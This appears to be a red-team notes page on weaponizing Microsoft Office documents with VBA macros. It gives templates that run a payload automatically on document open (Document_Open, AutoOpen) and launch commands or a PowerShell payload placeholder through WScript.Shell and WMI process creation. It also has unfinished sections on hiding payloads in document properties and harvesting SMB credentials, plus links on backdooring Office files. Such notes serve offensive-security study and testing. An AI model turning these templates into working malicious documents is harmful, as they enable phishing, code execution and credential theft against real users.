# Microsoft Office Macros Template

## 01 - Base

Base template when macro is being executed.

```vbscript
Sub Document_Open()
    Payload
End Sub

Sub AutoOpen()
    Payload
End Sub
```

## 02 - Command Execution

Command execution.

```vbscript
Sub Payload()
    ' VBA Macro has a 50 characters String
    ' Limit so you have to concatenate it
    Dim Str As String
    Str = Str + ""
    CreateObject("WScript.Shell").Run Str
    ' CreateObject("WScript.Shell").Run "cmd"
End Sub
```

PowerShell one-liners, Web-Drive By, harvest SMB credentials, etc.

```vbscript
Public Function Payload() As Variant
    Dim WindowScriptHost As Object
    Set WindowScriptHost = VBA.CreateObject("WScript.Shell")
    Dim waitOnReturn As Boolean: waitOnReturn = True
    Dim windowStyle As Integer: windowStyle = 7
    WindowScriptHost.Run "<powershell_payload>", windowStyle, waitOnReturn
End Function
```

Using WMI method to execute the process.

```vbscript
Sub WMI_Execution()
    Set Wmi = GetObject("winmgmts:\\.\root\cimv2")
    Set Process = Wmi.Get("Win32_Process")
    Process.Create("<commands>")
End Sub
```

## 04 - Payload Inside Document

TODO: Fill this info

Using **comments** in the **Properties** to include malware URL link to execute as shell via `rundll32.exe`

- [Malicious DLL Infection Through Metasploit SMB Exploit](https://www.drchaos.com/post/malicious-dll-infection-thru-metasploit-smb-exploit)

- [The Art of Creating backdoors and Exploits with Metasploit (Duplicate)](https://www.drchaos.com/post/the-art-of-creating-backdoors-and-exploits-with-metasploit)

- [Bank Security: MS Excel Weaponization Techniques](https://bank-security.medium.com/ms-excel-weaponization-techniques-79ac51610bf5)

## 05 - Harvest SMB Credentials

TODO: Demonstrate as many examples to fetch credentials using SMB relay via Responder

Refer to **Client-Side Attacks** subsection under [[02 - Responder|Responder]].

Refer to **Client-Side Attacks** subsection under [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xD - Client-Side Attacks/Authentication Relay/Metasploit|Metasploit]].

- [Securify: Living off the Land Stealing NetNTLM Hashes](https://www.securify.nl/blog/living-off-the-land-stealing-netntlm-hashes/)

- [n00py: Phishing with Maldocs](https://www.n00py.io/2017/04/phishing-with-maldocs/)

## 02 - HTA

TODO: Fill this info


---
## References

### mgeeky

- [mgeeky: Backdooring Office Structures. Part 1: The Oldschool](https://mgeeky.tech/backdooring-office-structures-part-1-oldschool/)

- [mgeeky:  Backdooring Office Structures. Part 2: Payload Crumbs In Custom Parts ](https://mgeeky.tech/payload-crumbs-in-custom-parts/)

### Offensive Security

- [Offensive Security: Weaponizing and Abusing Hidden Functionalities Contained in Office Document Properties](https://www.offsec.com/blog/macro-weaponization/)

### Denwp

- [Denwp: From Base64 to Reverse Shell - Unpacking Malware from a Word Document](https://denwp.com/macro-word-document/)

### Sevagas

- [sevagas: Advanced_Initial_access_in_2024_OffensiveX](https://github.com/sevagas/Advanced_Initial_access_in_2024_OffensiveX/blob/main/breach_the_gates_extended.pdf)

### War Room

- [War Room: Metasploit Module of the Month Web Delivery](https://warroom.rsmus.com/metasploit-module-of-the-month-web_delivery/)

### nicholasmckinney

- [nicholasmckinney: Shellcode Execution Via HTA](https://gist.github.com/nicholasmckinney/e90e47e0545430656bdcca5544d6b4fc)